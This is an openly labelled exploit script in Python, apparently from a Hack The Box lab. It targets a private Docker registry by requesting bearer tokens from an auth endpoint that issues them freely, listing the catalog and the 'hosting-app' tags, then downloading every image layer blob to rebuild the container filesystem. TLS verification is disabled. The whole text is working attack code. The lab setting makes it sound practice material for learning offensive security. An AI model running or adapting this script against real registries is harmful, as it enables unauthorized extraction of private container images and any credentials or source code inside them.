#!/usr/bin/env python3

import requests
import argparse
import json
import os

# This is necessary for disabling the 'verify=False' warning
import urllib3
urllib3.disable_warnings()

'''
https://10.10.11.223:5000/v2             # Not important
https://10.10.11.223:5000/v2/_catalog    # Docker registry catalog
https://10.10.11.223:5001/auth           # Auth endpoint
'''
basedir = os.path.dirname(__file__)

parser = argparse.ArgumentParser(
    prog='exploit.py',
    description='Interacts with the private Docker registry in a certain HTB box. Downloads all blobs listed within the repo manifest.',
    epilog='Author: 4wayhandshake')

parser.add_argument('ip', help='IP address of the target. Ex. 10.10.11.224', type=str)
parser.add_argument('blob_directory', help='Directory to download all blobs into', type=str)

args = parser.parse_args()

tgt_url = f'https://{args.ip}'
blob_dir = args.blob_directory

s = requests.session()

def authenticate(tgt_url, service, scope):
    # GET request to auth endpoint
    port = 5001
    endpoint = '/auth'
    url = f'{tgt_url}:{port}{endpoint}'
    # With no query params, the response to list_repos responds with www-authenticate
    # header, asking for service="Docker registry",scope="registry:catalog:*". So
    # I'll include those in the auth token request.
    params = {
        'service': service,
        'scope': scope
    }
    print(f'Obtaining auth token for service: "{service}" and scope:"{scope}"')
    response = s.get(url, params=params, verify=False)
    return response.json()
        
def query_registry(tgt_url, authTokens, endpoint, verbose=False):
    port = 5000
    url = f'{tgt_url}:{port}{endpoint}'
    # Need to include the bearer token in the Authorization header
    headers = {'Authorization': 'Bearer ' + authTokens['token']}
    if verbose:
        print(f'Request headers:\n{json.dumps(headers, indent=4)}')
    # HTTPS reminder: verify=False is like cURL's --insecure flag.
    response = s.get(url, headers=headers, verify=False)
    print(
        f'Response: [{response.status_code}] GET {url}\n'
        f'Headers:\n{json.dumps(dict(response.headers), indent=4)}\n'
        f'Text:\n{response.text}'
        )
    return response
    
def list_blobs(qry_response):
    ''' Extract just the hashes from a data structure that looks like this:
        "fsLayers": [
          {
             "blobSum": "sha256:a3ed95ca...955b46d4"
          },
          ...
         ]
    '''
    blob_arr = []
    data = json.loads(qry_response.content)
    if ("fsLayers" not in data) or ('blobSum' not in data['fsLayers'][0]):
        return blob_arr
    for x in data["fsLayers"]:
        blob = x['blobSum'].split(":")[1] # Just get the hash part
        if blob not in blob_arr:
            blob_arr.append(blob)
    return blob_arr
        
def download_blob(tgt_url, authTokens, directory, blob_hash):
    port = 5000
    url = f'{tgt_url}:{port}/v2/hosting-app/blobs/sha256:{blob_hash}'
    headers = {'Authorization': 'Bearer ' + authTokens['token']}
    outfile = os.path.join(directory, f'{blob_hash}.tar.gz')
    response = s.get(url, headers=headers, verify=False)
    with open(outfile, 'wb') as f:
        f.write(response.content)
        print(f'Blob downloaded: {outfile}')

# List the repos in the registry    
tokens = authenticate(tgt_url, 'Docker registry', 'registry:catalog:*')
query_registry(tgt_url, tokens, '/v2/_catalog')

# List the tags for the repo
tokens = authenticate(tgt_url, 'Docker registry', 'repository:hosting-app:pull')
query_registry(tgt_url, tokens, '/v2/hosting-app/tags/list')

# Read the manifest for the tag. Make a list of all the blobs
resp = query_registry(tgt_url, tokens, '/v2/hosting-app/manifests/latest')
blob_hashes = list_blobs(resp)

# Check that the directory exists first
directory = os.path.join(basedir,blob_dir)
if not os.path.isdir(directory):
    os.makedirs(directory)
    
for blob_hash in blob_hashes:
    download_blob(tgt_url, tokens, directory, blob_hash)

print('All files downloaded:\nDecompress them all into directory "fs" \
by using something like\n\tcat blobs/*.tar.gz  | tar -xzf - -C fs -i')
       
# Download the specified commit
#blob_hash = 'sha256:a3ed95caeb02ffe68cdd9fd84406680ae93d633cb16422d00e8a7c22955b46d4'
#download_endpt = f'/v2/hosting-app/blobs/{blob_hash}'
#outfile = 'downloaded-blob.tar.gz'
#download_blob(tgt_url, tokens, download_endpt, outfile)
